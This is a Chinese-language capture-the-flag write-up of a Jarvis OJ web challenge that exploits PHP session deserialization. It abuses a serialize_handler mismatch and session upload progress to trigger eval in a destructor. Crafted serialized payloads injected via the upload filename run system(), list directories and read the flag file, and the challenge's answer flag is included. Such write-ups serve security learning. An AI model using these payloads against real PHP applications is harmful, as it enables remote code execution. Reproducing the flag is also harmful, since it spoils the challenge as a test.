## 描述

题目入口：http://web.jarvisoj.com:32784/

## 题解

进去就得到这些代码，这也是 `index.php` 自身的源码。

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }
    
    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

headers 里没有什么可疑的东西。

分析一下代码可以知道，可以尝试 `phpinfo` 这个域来搞事情。

尝试 http://web.jarvisoj.com:32784/?phpinfo 得到了 PHP 的一些信息（我保存到了 [phpinfo.html](./assets/phpinfo.html) 里）。

搜了一些关键字没啥发现。御剑扫了一下发现有 `phpmyadmin`，说明有数据库可以玩，可能要注入（在 phpinfo 里搜索 mysql 也能发现）。

好吧，摸索了一下，完全没头绪。看题解。

md 这都是什么神仙漏洞啊。。。。。。。。。突破口在 `OowoO` 的构造、析构函数和代码

```php
ini_set('session.serialize_handler', 'php');
session_start();
```

有一个洞是 PHP 序列化与反序列化 handler 不一致从而利用 session 实现构造对象。

漏洞详细介绍可以查看 https://blog.spoock.com/2016/10/16/php-serialize-problem/ 在这我只简单介绍一下。

`session.serialize_handler` 有几种存储方式（见[官方文档](https://www.php.net/manual/zh/session.configuration.php#ini.session.serialize-handler)），这里介绍其中两种：

- `php_serialize`：数据经过 `serialize/unserialize` 来进行存储/读取 session
- `php`：键名 + 竖线 + 数据经过`serialize/unserialize` 来进行存储/读取 session

若存储和读取时方式不一致，就会产生漏洞。比如以 `php_serialize` 的方式将一段 `php` 格式的反序列化字符串存储到 session 中，再调用有 `session_start()` 的、handler 格式为 `php` 的 php 文件，便能实现构造一个对象。

PHP 在 5.5.4 版本之后默认将 `session.serialize_handler`，而在这里却将 `session.serialize_handler` 设置成了 `php`（通过 phpinfo 查看相应条目也能看到），所以有这个漏洞。

再结合 `OowoO` 这个析构函数里会执行 `mdzz` 这个字符串，所以我们可以构造一个 `OowoO`，然后利用漏洞达到执行任何指令的目的。

但是现在问题在于，如何将我们构造的 `OowoO` 存储到 session 里。答案在 `session.upload_progress.enabled` 这个选项里，通过查阅[官方文档](https://www.php.net/manual/zh/session.upload-progress.php)得知，可以构造上传达到存信息到 session 里，文档里有个例子

```html
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```

则 session 里存储的为

```
<?php
$_SESSION["upload_progress_123"] = array(
 "start_time" => 1234567890,   // The request time
 "content_length" => 57343257, // POST content length
 "bytes_processed" => 453489,  // Amount of bytes received and processed
 "done" => false,              // true when the POST handler has finished, successfully or not
 "files" => array(
  0 => array(
   "field_name" => "file1",       // Name of the <input/> field
   // The following 3 elements equals those in $_FILES
   "name" => "foo.avi",
   "tmp_name" => "/tmp/phpxxxxxx",
   "error" => 0,
   "done" => true,                // True when the POST handler has finished handling this file
   "start_time" => 1234567890,    // When this file has started to be processed
   "bytes_processed" => 57343250, // Amount of bytes received and processed for this file
  ),
  // An other file, not finished uploading, in the same request
  1 => array(
   "field_name" => "file2",
   "name" => "bar.avi",
   "tmp_name" => NULL,
   "error" => 0,
   "done" => false,
   "start_time" => 1234567899,
   "bytes_processed" => 54554,
  ),
 )
);
```

原理弄明白了以后，开始搞事情。

序列化一个 `OowoO` 为 `O:5:"OowoO":1:{s:4:"mdzz";s:31:"print(system("ls /opt/lampp/htdocs/"))";}`，然后将其作为文件名构造提交。但是文件名一般不支持这些特殊字符，所以得用一些手段，BurpSuite 来抓包并修改文件名。

编写一个 html 文件用于上传文件

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

然后随便上传一个文件，BP 抓包后修改上传的文件名为

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

（双引号转义是因为 HTTP 报文包里 filename 的值是用 `"` 来包裹的）然后便得到了

```
Array
(
    [0] => .
    [1] => ..
    [2] => Here_1s_7he_fl4g_buT_You_Cannot_see.php
    [3] => index.php
    [4] => phpinfo.php
)
```

再读取 `Here_1s_7he_fl4g_buT_You_Cannot_see.php` 这个文件就好

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:75:\"echo readfile(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\");\";}
```

得到

```
<?php 
	$flag="CTF{4d96e37f4be998c50aa586de4ada354a}";
?>59
```

## 答案

CTF{4d96e37f4be998c50aa586de4ada354a}
